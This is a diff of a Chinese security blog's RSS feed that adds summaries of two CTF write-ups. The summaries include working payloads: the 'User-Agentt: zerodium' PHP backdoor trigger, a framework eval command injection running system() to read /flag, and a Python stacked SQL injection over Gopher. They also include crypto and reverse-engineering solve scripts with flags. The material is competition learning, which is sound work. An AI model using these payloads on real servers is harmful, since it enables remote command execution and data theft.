@@ -6,7 +6,41 @@
     <description>Recent content in Posts on wh1sper</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
-    <lastBuildDate>Fri, 12 Mar 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/post/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sun, 04 Apr 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/post/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>虎符CTF Writeup by X1cT34m</title>
+      <link>https://anthem-whisper.github.io/p/%E8%99%8E%E7%AC%A6ctf-writeup-by-x1ct34m/</link>
+      <pubDate>Sun, 04 Apr 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/%E8%99%8E%E7%AC%A6ctf-writeup-by-x1ct34m/</guid>
+      <description>MISC 你会日志分析吗 时间注入，手撸日志得到ascii码，转换到ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0fQ==，base64解密
+Web 签到 签到访问任意PHP文件，User-Agentt: zerodiumphpinfo();
+User-Agentt: zerodiumsystem(&amp;lsquo;cat /flag&amp;rsquo;);
+unsetme 看到是fatfree框架，github下载最新fatfree-3.7.3源码，本地index.php改成题目给的
+传参后看到debug的调用栈，本地动态调试一下
+直接在unset下断点
+跟进到base.php，看到530行左右有eval，因为是拼接执行所以猜测存在命令注入
+虽然对引号等有转义，但是绕一下就ok，调试的时候发现主要是它对[]过滤的有点问题
+?a=n[]);system($_POST[0]);echo(1 POST: 0=cat /flag flag{d77d7d9b-941a-4087-949f-c72a466f9c5b}
+“慢慢做”管理系统 第一步MD5哈希注入，密码kydba
+第二步Gopher打admin.php，存在堆叠注入，用强网杯随便注的rename改表名能得到admin_inner的账户密码
+但是登陆名需要猜解，是admin
+# python3 # wh1sper from urllib.parse import quote #username = &amp;#34;1&amp;#39;;rename table real_admin_here_do_you_find to thetmp;rename table fake_admin to real_admin_here_do_you_find;rename table thetmp to fake_admin;&amp;#34; #username = &amp;#34;1&amp;#34; username = &amp;#34;admin&amp;#34;#admin_inner/5fb4e07de914cfc82afb44vbaf402203d #我草泥马的脑瘫题 password = &amp;#34;5fb4e07de914cfc82afb44vbaf402203&amp;#34;#fake_admin/fake_passwor post_data = &amp;#34;username={}&amp;amp;password={}&amp;#34;.format(quote(username), quote(password)) cl = len(post_data) stream = &amp;#34;&amp;#34;&amp;#34;POST /flag.php HTTP/1.1 Host: 127.</description>
+    </item>
+    
+    <item>
+      <title>红明谷杯 Writeup by X1cT34m</title>
+      <link>https://anthem-whisper.github.io/p/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF-writeup-by-x1ct34m/</link>
+      <pubDate>Sat, 03 Apr 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF-writeup-by-x1ct34m/</guid>
+      <description>Misc 签到 BP抓包爆破
+Crypto RSA attack 开三次方根就有了
+from gmpy2 import iroot from Crypto.Util.number import * p1=172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649936031 p2=172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649902034 n=28592245028568852124815768977111125874262599260058745599820769758676575163359612268623240652811172009403854869932602124987089815595007954065785558682294503755479266935877152343298248656222514238984548734114192436817346633473367019138600818158715715935132231386478333980631609437639665255977026081124468935510279104246449817606049991764744352123119281766258347177186790624246492739368005511017524914036614317783472537220720739454744527197507751921840839876863945184171493740832516867733853656800209669179467244407710022070593053034488226101034106881990117738617496520445046561073310892360430531295027470929927226907793 c=15839981826831548396886036749682663273035548220969819480071392201237477433920362840542848967952612687163860026284987497137578272157113399130705412843449686711908583139117413 e = 1+1+1 for k in range(1000): if iroot(c+k*n,3)[1]==True: m=iroot(c+k*n,3)[0] break flag=long_to_bytes(m) print(flag) Reverse go 调换顺序 ，base58没了
+import base58 text= b&amp;#34;2GVdudkYo2CBXoQii7gfpkjTc4gT&amp;#34; plaintext = &amp;#34;&amp;#34; table1 = b&amp;#34;12Nrst6CDquvG7BefghJKLMEFHPQZabRSTUVmyzno89ApwxWXYcdkij345&amp;#34; table2 = b&amp;#34;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&amp;#34; for i in range(len(text)): for j in range(len(table1)): if(text[i]==table1[j]): plaintext += chr(table2[j]) break print(plaintext) print(base58.b58decode(plaintext.encode())) flag{We1CTFc0m_2345} 顺序手动调换
+Pwn 双边协议1.0 from pwn import* import base64 #context.</description>
+    </item>
+    
     <item>
       <title>thinkphp5代码审计</title>
       <link>https://anthem-whisper.github.io/p/thinkphp5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</link>
